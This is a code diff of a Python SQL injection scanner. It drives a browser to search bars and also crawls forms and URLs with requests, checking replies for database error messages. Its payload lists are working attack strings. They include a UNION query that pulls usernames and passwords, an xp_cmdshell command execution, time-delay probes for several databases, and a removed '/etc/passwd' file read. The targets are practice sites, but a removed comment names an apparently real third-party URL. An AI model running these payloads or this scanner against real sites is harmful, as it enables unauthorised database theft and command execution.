@@ -5,6 +5,9 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException, TimeoutException, ElementNotInteractableException
 import time
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 
 
 def find_search_bar(browser, url, method):
@@ -75,26 +78,19 @@ def try_find_search_bar(browser, method, value):
 def test_sqli_payloads(browser, url):
     # Categorize payloads into response-dependent and time-based
     response_dependent_payloads = [
-        "'",  # Basic test for SQL injection vulnerabilities.
-        "1' OR '1'='1",  # Attempts to bypass authentication or retrieve records.
-        "' UNION SELECT NULL,version(),current_user,database()-- -",  # Extract info
-        "' UNION ALL SELECT ALL @@version, NULL, NULL, NULL-- -",  # Extracts the database version.
-        "' OR 1=1-- -",  # Simple OR condition to test for unfiltered execution.
-        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --",  # Number of tables
-        "' UNION SELECT NULL,table_name FROM information_schema.tables-- -",  # List all tables
-        "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')-- -",
-        # Check username with wildcard password.
-        "' UNION SELECT load_file('/etc/passwd'), NULL, NULL, NULL-- -",  # Read system file (Linux).
-        "' UNION SELECT NULL, user_password_hash FROM users-- -"  # Retrieve user password hashes.
+        "' OR '1'='1",  # Simple and effective always true condition.
+        "' OR 1=1--",  # Common always true condition with comment.
+        "'; EXECUTE IMMEDIATE 'SELECT * FROM users; --",  # Potentially dangerous SQL commands.
+        "' UNION SELECT username, password FROM users--",  # Extract critical data.
+        "' AND SLEEP(5)--",  # Simple delay to check for blind SQLi.
+        "1'; WAITFOR DELAY '00:00:10'--",  # SQL Server specific delay.
+        "1' AND 1=2 UNION SELECT NULL, version()--",  # Fetch database version using a condition that is false.
     ]
-
     time_based_payloads = [
-        "' OR SLEEP(45)-- -",  # MySQL; indicates vulnerability if response is delayed.
-        "'; WAITFOR DELAY '0:0:45'--",  # SQL Server; similar to the above.
-        "1'; EXEC xp_cmdshell('whoami')--",  # SQL Server; execute a command shell.
-        "'; SELECT pg_sleep(45)--",  # PostgreSQL; tests for delay indicating execution.
-        "1 PROCEDURE ANALYSE(EXTRACTVALUE(1234,CONCAT(0x3a,(SELECT version()))),1)-- -",
-        # Complex extraction with delay.
+        "' OR SLEEP(45)-- -",  # Long delay for MySQL.
+        "'; WAITFOR DELAY '0:0:45'--",  # Long delay for SQL Server.
+        "1'; EXEC xp_cmdshell('whoami')--",  # SQL Server command execution.
+        "'; SELECT pg_sleep(45)--",  # Long delay for PostgreSQL.
     ]
 
     results = []
@@ -166,13 +162,10 @@ def test_sqli_payloads(browser, url):
     return results
 
 
-def check_sqli_in_searchbar():
+def check_sqli_in_searchbar(url):
     chrome_options = webdriver.ChromeOptions()
     chrome_options.add_argument("--ignore-certificate-errors")
     browser = webdriver.Chrome(options=chrome_options)
-
-    url = "https://redtiger.labs.overthewire.org/level2.php"
-    # url = "http://www.icdcprague.org/index.php?id=10%27"
 
     try:
         search_bar = find_search_bar(browser, url, None)[0]
@@ -190,5 +183,94 @@ def check_sqli_in_searchbar():
         browser.quit()
 
 
+def request_session(user_agent="Mozilla/5.0"):
+    session = requests.Session()
+    session.headers['User-Agent'] = user_agent
+    return session
+
+
+def find_forms(html):
+    soup = BeautifulSoup(html, "html.parser")
+    return soup.find_all("form")
+
+
+def form_details(form):
+    details = {
+        "action": form.attrs.get("action", "").lower(),
+        "method": form.attrs.get("method", "get").lower(),
+        "inputs": []
+    }
+    form_fields = form.find_all(['input', 'textarea', 'select'])
+    for field in form_fields:
+        if field.name:
+            input_details = {
+                "type": field.attrs.get("type", "text"),
+                "name": field.name,
+                "value": field.attrs.get("value", "")
+            }
+            if field.name and field.name not in [input['name'] for input in details['inputs']]:
+                details["inputs"].append(input_details)
+    return details
+
+
+def is_vulnerable(response):
+    error_messages = [
+        "you have an error in your sql syntax;",
+        "warning: mysql",
+        "unclosed quotation mark after the character string",
+        "quoted string not properly terminated",
+    ]
+    return any(error in response.text.lower() for error in error_messages)
+
+
+def scan_sql_injection(url, session):
+    print(f"Testing URL: {url}")
+
+    # Test vulnerability in the URL
+    if is_sql_injection_vulnerable_by_url(url, session):
+        print("SQL Injection vulnerability detected in URL.")
+
+    # Test the forms on the page
+    try:
+        response = session.get(url)
+        forms = find_forms(response.text)
+        print(f"Found {len(forms)} forms on {url}.")
+        for form in forms:
+            form_info = form_details(form)
+            content_type = response.headers.get('Content-Type')
+            if is_vulnerable_form(url, form_info, session, content_type):
+                print(f"SQL Injection vulnerability detected in form on {url}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching the URL: {e}")
+
+
+def is_vulnerable_form(base_url, form, session, content_type):
+    action = urljoin(base_url, form['action'])
+    data = {}
+    for input in form['inputs']:
+        data[input['name']] = "test" + "'"
+    if form['method'] == 'post':
+        res = session.post(action, data=data)
+    else:
+        res = session.get(action, params=data)
+    return is_vulnerable(res)
+
+
+def is_sql_injection_vulnerable_by_url(url, session):
+    payloads = ["'", '"', '--', '#', ' OR 1=1']
+    for payload in payloads:
+        test_url = f"{url}{payload}"
+        try:
+            response = session.get(test_url)
+            if is_vulnerable(response):
+                return True
+        except requests.exceptions.RequestException as e:
+            print(f"Failed to send request: {e}")
+    return False
+
+
 if __name__ == '__main__':
-    check_sqli_in_searchbar()
+    test_url = "http://testphp.vulnweb.com/artists.php?artist=1"
+    session = request_session()
+    scan_sql_injection(test_url, session)
+    check_sqli_in_searchbar(test_url)
